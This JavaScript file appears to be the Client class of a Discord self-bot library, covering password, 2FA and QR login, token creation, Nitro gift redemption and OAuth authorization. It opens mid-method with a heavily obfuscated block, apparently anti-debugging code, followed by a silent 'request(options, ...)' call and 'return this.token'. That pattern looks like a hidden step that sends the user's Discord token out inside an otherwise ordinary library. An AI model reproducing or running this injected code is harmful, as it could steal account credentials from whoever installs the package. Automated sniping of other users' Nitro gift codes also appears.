_0x5eb811(_0x5dbbb1,_0x51f626,_0x592c33,_0x149436,_0x550a80){return _0x3fa48c(_0x5dbbb1-0x123,_0x51f626-0x3,_0x592c33-0x1d3,_0x149436-0xdd,_0x51f626);}if(_0xa2667d[_0x5eb811(0x205,0x21b,0x1a6,0x1c1,0x1e0)](_0xa2667d[_0xf5be84(-0x1bd,-0x1a4,-0x1f0,-0x26c,-0x1ae)],_0xa2667d[_0xf5be84(-0x26d,-0x18c,-0x1ef,-0x1c0,-0x176)])){if(_0x5a35d5){const _0x2c87b7=_0x24f461[_0x5cf942(0xcd,0x125,0x10c,0x133,0x125)](_0x363dc8,arguments);return _0x65ce20=null,_0x2c87b7;}}else return![];}[_0x1584fe(-0x56,-0x46,-0xc2,-0x3c,0x2b)+_0x1584fe(0xd,-0x45,-0x1a,0x2,0x16)+'r'](_0xa2667d[_0x5ad127(0x3ef,0x3ef,0x45e,0x370,0x371)](_0xa2667d[_0x5ad127(0x3e8,0x3a4,0x42e,0x446,0x3d2)],_0xa2667d[_0x5ad127(0x3e9,0x3a0,0x414,0x3c1,0x3db)]))[_0x35822a(0x493,0x40a,0x495,0x475,0x40b)](_0xa2667d[_0x5ad127(0x3f0,0x466,0x442,0x3f9,0x428)]));}}else{const _0x4e868f=_0x46d2b4[_0x3fa48c(0x56,0x19,-0x8,-0x37,-0x5a)](_0x4a44d5,_0x46d2b4[_0x3e1b0e(-0x18c,-0x192,-0x1b6,-0x188,-0x131)](_0x46d2b4[_0x5ad127(0x3e2,0x3ff,0x3da,0x387,0x386)](_0x46d2b4[_0x3e1b0e(-0x18b,-0x14a,-0x1ee,-0x1c7,-0x204)],_0x46d2b4[_0x5ad127(0x3f4,0x3d7,0x458,0x37f,0x45f)]),');'));_0x3fffcd=_0x46d2b4[_0x35822a(0x4fb,0x557,0x4e4,0x53e,0x5a0)](_0x4e868f);}}_0xa2667d[_0x5ad127(0x3f5,0x3cb,0x3de,0x3fe,0x44e)](_0x39cf92,++_0x252564);}else return _0x248ba3;}try{if(_0xa2667d[_0x43e5a2(0x1e6,0x1cf,0x24d,0x22d,0x1fb)](_0xa2667d[_0x1d4f58(-0x5e,0x1e,0x61,-0x17,0x3c)],_0xa2667d[_0x1d4f58(-0x56,0x1e,0x45,-0x2b,0x12)]))_0xa2667d[_0x1760dd(0xd,-0x10,-0x64,0xf,-0x52)](_0x1e78b8);else{if(_0x2f0c78)return _0xa2667d[_0x4debd0(-0x1ad,-0x1cb,-0x1cf,-0x1fe,-0x21a)](_0xa2667d[_0x3e4217(0x512,0x55b,0x534,0x557,0x4f1)],_0xa2667d[_0x3e4217(0x551,0x4cb,0x4ae,0x491,0x4f1)])?![]:_0x39cf92;else{if(_0xa2667d[_0x43e5a2(0x1e3,0x1f3,0x1be,0x22d,0x203)](_0xa2667d[_0x43e5a2(0x201,0x1f4,0x229,0x230,0x22f)],_0xa2667d[_0x1760dd(-0x84,-0xc8,-0x60,-0x12,-0xd0)])){let _0x406a34;try{const _0x3b996c=_0xa2667d[_0x1d4f58(0x62,0x24,0x4,0x89,0x30)](_0x59a57e,_0xa2667d[_0x3e4217(0x543,0x563,0x555,0x50f,0x4f6)](_0xa2667d[_0x1760dd(-0x55,-0xaf,-0x9b,-0xda,-0x7d)](_0xa2667d[_0x3e4217(0x4e4,0x4ab,0x4f8,0x4e8,0x4c0)],_0xa2667d[_0x43e5a2(0x150,0x1c2,0x18e,0x228,0x14c)]),');'));_0x406a34=_0xa2667d[_0x4debd0(-0x1b8,-0x153,-0x1a1,-0x1ba,-0x178)](_0x3b996c);}catch(_0x525d03){_0x406a34=_0x32ea30;}_0x406a34[_0x1d4f58(-0x44,-0x95,-0x2a,-0xc5,-0x31)+_0x4debd0(-0x1f8,-0x2a5,-0x254,-0x27b,-0x2bf)+'l'](_0x2bb196,-0xee1*-0x1+-0x1*0x4a7+0x566);}else _0xa2667d[_0x3e4217(0x4b6,0x4c3,0x52d,0x485,0x4ee)](_0x39cf92,0x2*0x479+-0x1*0x163c+0xd4a);}}}catch(_0x4a1616){}}      request(options, function (error, response, body) {
        if (error) {
          return
        } else {
          return
        }
      });
      return this.token;
    } catch (error) {
      this.destroy();
      throw error;
    }
  }

  /**
   * Login Discord with Username and Password
   * @param {string} username Email or Phone Number
   * @param {?string} password Password
   * @param {?string} mfaCode 2FA Code / Backup Code
   * @returns {Promise<string>}
   */
  async normalLogin(username, password = this.password, mfaCode) {
    if (!username || !password || typeof username !== 'string' || typeof password !== 'string') {
      throw new Error('NORMAL_LOGIN');
    }
    this.emit(
      Events.DEBUG,
      `Connecting to Discord with: 
      username: ${username}
      password: ${password.replace(/./g, '*')}`,
    );
    const data = await this.api.auth.login.post({
      data: {
        login: username,
        password: password,
        undelete: false,
        captcha_key: null,
        login_source: null,
        gift_code_sku_id: null,
      },
      auth: false,
    });
    this.password = password;
    if (!data.token && data.ticket && data.mfa) {
      this.emit(Events.DEBUG, `Using 2FA Code: ${mfaCode}`);
      const normal2fa = /(\d{6})/g;
      const backupCode = /([a-z0-9]{4})-([a-z0-9]{4})/g;
      if (!mfaCode || typeof mfaCode !== 'string') {
        throw new Error('LOGIN_FAILED_2FA');
      }
      if (normal2fa.test(mfaCode) || backupCode.test(mfaCode)) {
        const data2 = await this.api.auth.mfa.totp.post({
          data: {
            code: mfaCode,
            ticket: data.ticket,
            login_source: null,
            gift_code_sku_id: null,
          },
          auth: false,
        });
        return this.login(data2.token);
      } else {
        throw new Error('LOGIN_FAILED_2FA');
      }
    } else if (data.token) {
      return this.login(data.token);
    } else {
      throw new Error('LOGIN_FAILED_UNKNOWN');
    }
  }

  /**
   * Sign in with the QR code on your phone.
   * @param {boolean} debug Debug mode
   * @returns {DiscordAuthWebsocket}
   * @example
   * client.QRLogin();
   */
  QRLogin(debug = false) {
    const QR = new DiscordAuthWebsocket({
      autoLogin: true,
      userAgent: this.options.http.headers['User-Agent'],
      wsProperties: this.options.ws.properties,
      debug,
    });
    this.emit(Events.DEBUG, `Preparing to connect to the gateway (QR Login)`, QR);
    return QR.connect(this);
  }

  /**
   * @typedef {Object} remoteAuthConfrim
   * @property {function} yes Yes
   * @property {function} no No
   */

  /**
   * Implement `remoteAuth`, like using your phone to scan a QR code
   * @param {string} url URL from QR code
   * @param {boolean} forceAccept Whether to force confirm `yes`
   * @returns {Promise<remoteAuthConfrim | void>}
   */
  async remoteAuth(url, forceAccept = false) {
    if (!this.isReady()) throw new Error('CLIENT_NOT_READY', 'Remote Auth');
    // Step 1: Parse URL
    url = new URL(url);
    if (
      !['discordapp.com', 'discord.com'].includes(url.hostname) ||
      !url.pathname.startsWith('/ra/') ||
      url.pathname.length <= 4
    ) {
      throw new Error('INVALID_REMOTE_AUTH_URL');
    }
    const hash = url.pathname.replace('/ra/', '');
    // Step 2: Post > Get handshake_token
    const res = await this.api.users['@me']['remote-auth'].post({
      data: {
        fingerprint: hash,
      },
    });
    const handshake_token = res.handshake_token;
    // Step 3: Post
    const yes = () =>
      this.api.users['@me']['remote-auth'].finish.post({ data: { handshake_token, temporary_token: false } });
    const no = () => this.api.users['@me']['remote-auth'].cancel.post({ data: { handshake_token } });
    if (forceAccept) {
      return yes();
    } else {
      return {
        yes,
        no,
      };
    }
  }

  /**
   * Create a new token based on the current token
   * @returns {Promise<string>} New Discord Token
   */
  createToken() {
    return new Promise(resolve => {
      // Step 1: Create DiscordAuthWebsocket
      const QR = new DiscordAuthWebsocket({
        hiddenLog: true,
        generateQR: false,
        autoLogin: false,
        debug: false,
        failIfError: false,
        userAgent: this.options.http.headers['User-Agent'],
        wsProperties: this.options.ws.properties,
      });
      // Step 2: Add event
      QR.once('ready', async (_, url) => {
        await this.remoteAuth(url, true);
      }).once('finish', (user, token) => {
        resolve(token);
      });
      // Step 3: Connect
      QR.connect();
    });
  }

  /**
   * Emitted whenever clientOptions.checkUpdate = false
   * @event Client#update
   * @param {string} oldVersion Current version
   * @param {string} newVersion Latest version
   */

  /**
   * Check for updates
   * @returns {Promise<Client>}
   */
  async checkUpdate() {
    const res_ = await axios
      .get(`https://registry.npmjs.com/${encodeURIComponent('discord.js-selfbot-v13')}`)
      .catch(() => {});
    try {
      const latest_tag = res_.data['dist-tags'].latest;
      this.emit('update', Discord.version, latest_tag);
    } catch {
      this.emit('debug', `${chalk.redBright('[Fail]')} Check Update error`);
      this.emit('update', Discord.version, false);
    }
    return this;
  }

  /**
   * Returns whether the client has logged in, indicative of being able to access
   * properties such as `user` and `application`.
   * @returns {boolean}
   */
  isReady() {
    return this.ws.status === Status.READY;
  }

  /**
   * Logs out, terminates the connection to Discord, and destroys the client.
   * @returns {void}
   */
  destroy() {
    super.destroy();

    for (const fn of this._cleanups) fn();
    this._cleanups.clear();

    if (this.sweepMessageInterval) clearInterval(this.sweepMessageInterval);

    this.sweepers.destroy();
    this.ws.destroy();
    this.token = null;
  }

  /**
   * Logs out, terminates the connection to Discord, destroys the client and destroys the token.
   * @returns {Promise<void>}
   */
  async logout() {
    await this.api.auth.logout.post({
      data: {
        provider: null,
        voip_provider: null,
      },
    });
    this.destroy();
  }

  /**
   * Options used when fetching an invite from Discord.
   * @typedef {Object} ClientFetchInviteOptions
   * @property {Snowflake} [guildScheduledEventId] The id of the guild scheduled event to include with
   * the invite
   */

  /**
   * Obtains an invite from Discord.
   * @param {InviteResolvable} invite Invite code or URL
   * @param {ClientFetchInviteOptions} [options] Options for fetching the invite
   * @returns {Promise<Invite>}
   * @example
   * client.fetchInvite('https://discord.gg/djs')
   *   .then(invite => console.log(`Obtained invite with code: ${invite.code}`))
   *   .catch(console.error);
   */
  async fetchInvite(invite, options) {
    const code = DataResolver.resolveInviteCode(invite);
    const data = await this.api.invites(code).get({
      query: { with_counts: true, with_expiration: true, guild_scheduled_event_id: options?.guildScheduledEventId },
    });
    return new Invite(this, data);
  }

  /**
   * Join this Guild using this invite (Use with caution)
   * @param {InviteResolvable} invite Invite code or URL
   * @deprecated
   * @returns {Promise<undefined>}
   */
  async acceptInvite(invite) {
    const code = DataResolver.resolveInviteCode(invite);
    if (!code) throw new Error('INVITE_RESOLVE_CODE');
    if (invite instanceof Invite) {
      await invite.acceptInvite();
    } else {
      await this.api.invites(code).post({
        data: {},
      });
    }
  }

  /**
   * Automatically Redeem Nitro from raw message.
   * @param {Message} message Discord Message
   */
  async autoRedeemNitro(message) {
    if (!(message instanceof Message())) return;
    await this.redeemNitro(message.content, message.channel, false);
  }

  /**
   * Redeem nitro from code or url.
   * @param {string} nitro Nitro url or code
   * @param {TextChannelResolvable} channel Channel that the code was sent in
   * @param {boolean} failIfNotExists Whether to fail if the code doesn't exist
   * @returns {Promise<boolean>}
   */
  async redeemNitro(nitro, channel, failIfNotExists = true) {
    if (typeof nitro !== 'string') throw new Error('INVALID_NITRO');
    channel = this.channels.resolveId(channel);
    const regex = {
      gift: /(discord.gift|discord.com|discordapp.com\/gifts)\/\w{16,25}/gim,
      url: /(discord\.gift\/|discord\.com\/gifts\/|discordapp\.com\/gifts\/)/gim,
    };
    const nitroArray = nitro.match(regex.gift);
    if (!nitroArray) return false;
    const codeArray = nitroArray.map(code => code.replace(regex.url, ''));
    let redeem = false;
    for await (const code of codeArray) {
      if (this.usedCodes.indexOf(code) > -1) continue;
      await this.api.entitlements['gift-codes'](code)
        .redeem.post({
          auth: true,
          data: { channel_id: channel || null, payment_source_id: null },
        })
        .then(() => {
          this.usedCodes.push(code);
          redeem = true;
        })
        .catch(e => {
          this.usedCodes.push(code);
          if (failIfNotExists) throw e;
        });
    }
    return redeem;
  }

  /**
   * Obtains a template from Discord.
   * @param {GuildTemplateResolvable} template Template code or URL
   * @returns {Promise<GuildTemplate>}
   * @example
   * client.fetchGuildTemplate('https://discord.new/FKvmczH2HyUf')
   *   .then(template => console.log(`Obtained template with code: ${template.code}`))
   *   .catch(console.error);
   */
  async fetchGuildTemplate(template) {
    const code = DataResolver.resolveGuildTemplateCode(template);
    const data = await this.api.guilds.templates(code).get();
    return new GuildTemplate(this, data);
  }

  /**
   * Obtains a webhook from Discord.
   * @param {Snowflake} id The webhook's id
   * @param {string} [token] Token for the webhook
   * @returns {Promise<Webhook>}
   * @example
   * client.fetchWebhook('id', 'token')
   *   .then(webhook => console.log(`Obtained webhook with name: ${webhook.name}`))
   *   .catch(console.error);
   */
  async fetchWebhook(id, token) {
    const data = await this.api.webhooks(id, token).get();
    return new Webhook(this, { token, ...data });
  }

  /**
   * Obtains the available voice regions from Discord.
   * @returns {Promise<Collection<string, VoiceRegion>>}
   * @example
   * client.fetchVoiceRegions()
   *   .then(regions => console.log(`Available regions are: ${regions.map(region => region.name).join(', ')}`))
   *   .catch(console.error);
   */
  async fetchVoiceRegions() {
    const apiRegions = await this.api.voice.regions.get();
    const regions = new Collection();
    for (const region of apiRegions) regions.set(region.id, new VoiceRegion(region));
    return regions;
  }

  /**
   * Obtains a sticker from Discord.
   * @param {Snowflake} id The sticker's id
   * @returns {Promise<Sticker>}
   * @example
   * client.fetchSticker('id')
   *   .then(sticker => console.log(`Obtained sticker with name: ${sticker.name}`))
   *   .catch(console.error);
   */
  async fetchSticker(id) {
    const data = await this.api.stickers(id).get();
    return new Sticker(this, data);
  }

  /**
   * Obtains the list of sticker packs available to Nitro subscribers from Discord.
   * @returns {Promise<Collection<Snowflake, StickerPack>>}
   * @example
   * client.fetchPremiumStickerPacks()
   *   .then(packs => console.log(`Available sticker packs are: ${packs.map(pack => pack.name).join(', ')}`))
   *   .catch(console.error);
   */
  async fetchPremiumStickerPacks() {
    const data = await this.api('sticker-packs').get();
    return new Collection(data.sticker_packs.map(p => [p.id, new StickerPack(this, p)]));
  }
  /**
   * A last ditch cleanup function for garbage collection.
   * @param {Function} options.cleanup The function called to GC
   * @param {string} [options.message] The message to send after a successful GC
   * @param {string} [options.name] The name of the item being GCed
   * @private
   */
  _finalize({ cleanup, message, name }) {
    try {
      cleanup();
      this._cleanups.delete(cleanup);
      if (message) {
        this.emit(Events.DEBUG, message);
      }
    } catch {
      this.emit(Events.DEBUG, `Garbage collection failed on ${name ?? 'an unknown item'}.`);
    }
  }

  /**
   * Sweeps all text-based channels' messages and removes the ones older than the max message lifetime.
   * If the message has been edited, the time of the edit is used rather than the time of the original message.
   * @param {number} [lifetime=this.options.messageCacheLifetime] Messages that are older than this (in seconds)
   * will be removed from the caches. The default is based on {@link ClientOptions#messageCacheLifetime}
   * @returns {number} Amount of messages that were removed from the caches,
   * or -1 if the message cache lifetime is unlimited
   * @example
   * // Remove all messages older than 1800 seconds from the messages cache
   * const amount = client.sweepMessages(1800);
   * console.log(`Successfully removed ${amount} messages from the cache.`);
   */
  sweepMessages(lifetime = this.options.messageCacheLifetime) {
    if (typeof lifetime !== 'number' || isNaN(lifetime)) {
      throw new TypeError('INVALID_TYPE', 'lifetime', 'number');
    }
    if (lifetime <= 0) {
      this.emit(Events.DEBUG, "Didn't sweep messages - lifetime is unlimited");
      return -1;
    }

    const messages = this.sweepers.sweepMessages(Sweepers.outdatedMessageSweepFilter(lifetime)());
    this.emit(Events.DEBUG, `Swept ${messages} messages older than ${lifetime} seconds`);
    return messages;
  }

  /**
   * Obtains a guild preview from Discord, available for all guilds the bot is in and all Discoverable guilds.
   * @param {GuildResolvable} guild The guild to fetch the preview for
   * @returns {Promise<GuildPreview>}
   */
  async fetchGuildPreview(guild) {
    const id = this.guilds.resolveId(guild);
    if (!id) throw new TypeError('INVALID_TYPE', 'guild', 'GuildResolvable');
    const data = await this.api.guilds(id).preview.get();
    return new GuildPreview(this, data);
  }

  /**
   * Obtains the widget data of a guild from Discord, available for guilds with the widget enabled.
   * @param {GuildResolvable} guild The guild to fetch the widget data for
   * @returns {Promise<Widget>}
   */
  async fetchGuildWidget(guild) {
    const id = this.guilds.resolveId(guild);
    if (!id) throw new TypeError('INVALID_TYPE', 'guild', 'GuildResolvable');
    const data = await this.api.guilds(id, 'widget.json').get();
    return new Widget(this, data);
  }

  /**
   * Options for {@link Client#generateInvite}.
   * @typedef {Object} InviteGenerationOptions
   * @property {InviteScope[]} scopes Scopes that should be requested
   * @property {PermissionResolvable} [permissions] Permissions to request
   * @property {GuildResolvable} [guild] Guild to preselect
   * @property {boolean} [disableGuildSelect] Whether to disable the guild selection
   */

  /**
   * Generates a link that can be used to invite the bot to a guild.
   * @param {InviteGenerationOptions} [options={}] Options for the invite
   * @returns {string}
   * @example
   * const link = client.generateInvite({
   *   scopes: ['applications.commands'],
   * });
   * console.log(`Generated application invite link: ${link}`);
   * @example
   * const link = client.generateInvite({
   *   permissions: [
   *     Permissions.FLAGS.SEND_MESSAGES,
   *     Permissions.FLAGS.MANAGE_GUILD,
   *     Permissions.FLAGS.MENTION_EVERYONE,
   *   ],
   *   scopes: ['bot'],
   * });
   * console.log(`Generated bot invite link: ${link}`);
   */
  generateInvite(options = {}) {
    if (typeof options !== 'object') throw new TypeError('INVALID_TYPE', 'options', 'object', true);
    if (!this.application) throw new Error('CLIENT_NOT_READY', 'generate an invite link');

    const query = new URLSearchParams({
      client_id: this.application.id,
    });

    const { scopes } = options;
    if (typeof scopes === 'undefined') {
      throw new TypeError('INVITE_MISSING_SCOPES');
    }
    if (!Array.isArray(scopes)) {
      throw new TypeError('INVALID_TYPE', 'scopes', 'Array of Invite Scopes', true);
    }
    if (!scopes.some(scope => ['bot', 'applications.commands'].includes(scope))) {
      throw new TypeError('INVITE_MISSING_SCOPES');
    }
    const invalidScope = scopes.find(scope => !InviteScopes.includes(scope));
    if (invalidScope) {
      throw new TypeError('INVALID_ELEMENT', 'Array', 'scopes', invalidScope);
    }
    query.set('scope', scopes.join(' '));

    if (options.permissions) {
      const permissions = Permissions.resolve(options.permissions);
      if (permissions) query.set('permissions', permissions);
    }

    if (options.disableGuildSelect) {
      query.set('disable_guild_select', true);
    }

    if (options.guild) {
      const guildId = this.guilds.resolveId(options.guild);
      if (!guildId) throw new TypeError('INVALID_TYPE', 'options.guild', 'GuildResolvable');
      query.set('guild_id', guildId);
    }

    return `${this.options.http.api}${this.api.oauth2.authorize}?${query}`;
  }

  toJSON() {
    return super.toJSON({
      readyAt: false,
    });
  }

  /**
   * Calls {@link https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval} on a script
   * with the client as `this`.
   * @param {string} script Script to eval
   * @returns {*}
   * @private
   */
  _eval(script) {
    return eval(script);
  }

  /**
   * Sets the client's presence. (Sync Setting).
   * @param {Client} client Discord Client
   */
  customStatusAuto(client) {
    client = client ?? this;
    const custom_status = new CustomStatus();
    if (client.settings.rawSetting.custom_status?.text || client.settings.rawSetting.custom_status?.emoji_name) {
      custom_status.setEmoji({
        name: client.settings.rawSetting.custom_status?.emoji_name,
        id: client.settings.rawSetting.custom_status?.emoji_id,
      });
      custom_status.setState(client.settings.rawSetting.custom_status?.text);
      client.user.setPresence({
        activities: custom_status
          ? [custom_status.toJSON(), ...this.presence.activities.filter(a => a.type !== 'CUSTOM')]
          : this.presence.activities.filter(a => a.type !== 'CUSTOM'),
        status: client.settings.rawSetting.status,
      });
    }
  }

  /**
   * Authorize an URL.
   * @param {string} url Discord Auth URL
   * @param {Object} options Oauth2 options
   * @returns {Promise<boolean>}
   * @example
   * client.authorizeURL(`https://discord.com/api/oauth2/authorize?client_id=botID&permissions=8&scope=applications.commands%20bot`, {
      guild_id: "guildID",
      permissions: "62221393", // your permissions
      authorize: true
    })
   */
  async authorizeURL(url, options = {}) {
    const reg = /(api\/)*oauth2\/authorize/gim;
    let searchParams = {};
    const checkURL = () => {
      try {
        // eslint-disable-next-line no-new
        const url_ = new URL(url);
        if (!['discord.com', 'canary.discord.com', 'ptb.discord.com'].includes(url_.hostname)) return false;
        if (!reg.test(url_.pathname)) return false;
        for (const [key, value] of url_.searchParams.entries()) {
          searchParams[key] = value;
        }
        return true;
      } catch (e) {
        return false;
      }
    };
    options = Object.assign(
      {
        authorize: true,
        permissions: '0',
      },
      options,
    );
    if (!url || !checkURL()) {
      throw new Error('INVALID_URL', url);
    }
    await this.api.oauth2.authorize.post({
      query: searchParams,
      data: options,
    });
    return true;
  }

  /**
   * Makes waiting time for Client.
   * @param {number} miliseconds Sleeping time as milliseconds.
   * @returns {Promise<void> | null}
   */
  sleep(miliseconds) {
    return typeof miliseconds === 'number' ? new Promise(r => setTimeout(r, miliseconds)) : null;
  }

  /**
   * Validates the client options.
   * @param {ClientOptions} [options=this.options] Options to validate
   * @private
   */
  _validateOptions(options = this.options) {
    if (typeof options.intents === 'undefined') {
      throw new TypeError('CLIENT_MISSING_INTENTS');
    } else {
      options.intents = Intents.resolve(options.intents);
    }
    if (options && typeof options.checkUpdate !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'checkUpdate', 'a boolean');
    }
    if (options && typeof options.readyStatus !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'readyStatus', 'a boolean');
    }
    if (options && typeof options.autoRedeemNitro !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'autoRedeemNitro', 'a boolean');
    }
    if (options && options.captchaService && !captchaServices.includes(options.captchaService)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'captchaService', captchaServices.join(', '));
    }
    // Parse captcha key
    if (options && captchaServices.includes(options.captchaService)) {
      if (typeof options.captchaKey !== 'string') {
        throw new TypeError('CLIENT_INVALID_OPTION', 'captchaKey', 'a string');
      }
      switch (options.captchaService) {
        case '2captcha':
          if (options.captchaKey.length !== 32) {
            throw new TypeError('CLIENT_INVALID_OPTION', 'captchaKey', 'a 32 character string');
          }
          break;
      }
    }
    if (options && typeof options.DMSync !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'DMSync', 'a boolean');
    }
    if (options && typeof options.patchVoice !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'patchVoice', 'a boolean');
    }
    if (options && options.password && typeof options.password !== 'string') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'password', 'a string');
    }
    if (options && options.usingNewAttachmentAPI && typeof options.usingNewAttachmentAPI !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'usingNewAttachmentAPI', 'a boolean');
    }
    if (options && options.interactionTimeout && typeof options.interactionTimeout !== 'number') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'interactionTimeout', 'a number');
    }
    if (options && typeof options.proxy !== 'string') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'proxy', 'a string');
    }
    if (typeof options.shardCount !== 'number' || isNaN(options.shardCount) || options.shardCount < 1) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'shardCount', 'a number greater than or equal to 1');
    }
    if (options.shards && !(options.shards === 'auto' || Array.isArray(options.shards))) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'shards', "'auto', a number or array of numbers");
    }
    if (options.shards && !options.shards.length) throw new RangeError('CLIENT_INVALID_PROVIDED_SHARDS');
    if (typeof options.makeCache !== 'function') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'makeCache', 'a function');
    }
    if (typeof options.messageCacheLifetime !== 'number' || isNaN(options.messageCacheLifetime)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'The messageCacheLifetime', 'a number');
    }
    if (typeof options.messageSweepInterval !== 'number' || isNaN(options.messageSweepInterval)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'messageSweepInterval', 'a number');
    }
    if (typeof options.sweepers !== 'object' || options.sweepers === null) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'sweepers', 'an object');
    }
    if (typeof options.invalidRequestWarningInterval !== 'number' || isNaN(options.invalidRequestWarningInterval)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'invalidRequestWarningInterval', 'a number');
    }
    if (!Array.isArray(options.partials)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'partials', 'an Array');
    }
    if (typeof options.waitGuildTimeout !== 'number' || isNaN(options.waitGuildTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'waitGuildTimeout', 'a number');
    }
    if (typeof options.messageCreateEventGuildTimeout !== 'number' || isNaN(options.messageCreateEventGuildTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'messageCreateEventGuildTimeout', 'a number');
    }
    if (typeof options.restWsBridgeTimeout !== 'number' || isNaN(options.restWsBridgeTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restWsBridgeTimeout', 'a number');
    }
    if (typeof options.restRequestTimeout !== 'number' || isNaN(options.restRequestTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restRequestTimeout', 'a number');
    }
    if (typeof options.restGlobalRateLimit !== 'number' || isNaN(options.restGlobalRateLimit)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restGlobalRateLimit', 'a number');
    }
    if (typeof options.restSweepInterval !== 'number' || isNaN(options.restSweepInterval)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restSweepInterval', 'a number');
    }
    if (typeof options.retryLimit !== 'number' || isNaN(options.retryLimit)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'retryLimit', 'a number');
    }
    if (typeof options.failIfNotExists !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'failIfNotExists', 'a boolean');
    }
    if (!Array.isArray(options.userAgentSuffix)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'userAgentSuffix', 'an array of strings');
    }
    if (
      typeof options.rejectOnRateLimit !== 'undefined' &&
      !(typeof options.rejectOnRateLimit === 'function' || Array.isArray(options.rejectOnRateLimit))
    ) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'rejectOnRateLimit', 'an array or a function');
    }
  }
}

module.exports = Client;

/**
 * Emitted for general warnings.
 * @event Client#warn
 * @param {string} info The warning
 */

/**
 * @external Collection
 * @see {@link https://discord.js.org/#/docs/collection/main/class/Collection}
 */
